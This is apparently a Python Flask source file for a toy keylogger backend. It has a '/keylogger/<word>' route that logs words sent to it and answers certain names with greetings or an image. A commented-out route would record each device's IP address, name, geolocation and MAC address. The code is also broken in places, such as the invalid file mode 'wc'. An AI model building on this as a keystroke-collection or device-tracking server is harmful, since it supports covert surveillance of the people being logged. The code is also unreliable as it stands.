from flask import Response
from flask import request
from flask import json
from flask import send_file
from .user import User
from .database import db, app


string_data = ''

@app.route('/keylogger/<word>', methods=["GET", "POST"])
def check_word(word):
    string_file = open('string_data', 'wc')
    string_file.write(word)
    string_file.close()
    
    string_file = open('string_data', 'r')
    string_data = string_file.read()
    string_file.close()
    
    if 'yoni' in string_data:
        string_data = ''
        return 'hi yoni'
    if 'itay' in string_data:
        string_data = ''
        return 'hi itay'
    if 'cat' in string_data:
        string_data = ''
        return send_file('images/cat.jpg', mimetype='image')
    return ''





# @app.route('/update', methods=["POST"])
# def update():
#     ip = request.form['ip']
#     name = request.form['name']
#     latitude = request.form['latitude']
#     longitude = request.form['longitude']
#     country = request.form['country']
#     city = request.form['city']
#     mac = request.form['mac']
#     try:
#         db.session.query(User).filter(User.mac == mac).one()
#         return Response("Device is already in database", status=200, mimetype='application/json')
#     except:
#         new_user = User(mac, ip, name, latitude, longitude, country, city)
#         db.session.add(new_user)
#         db.session.commit()
#         return Response("Welcome " + name, status=200, mimetype='application/json')



